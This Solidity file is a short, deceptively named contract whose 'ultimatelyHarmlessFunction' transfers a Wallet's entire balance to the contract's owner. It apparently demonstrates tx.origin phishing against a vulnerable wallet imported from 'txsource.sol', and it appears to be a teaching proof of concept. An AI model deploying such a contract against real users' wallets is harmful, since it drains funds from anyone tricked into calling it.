// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import "./txsource.sol";

contract ExtremelyTrustableContract {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function ultimatelyHarmlessFunction() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}

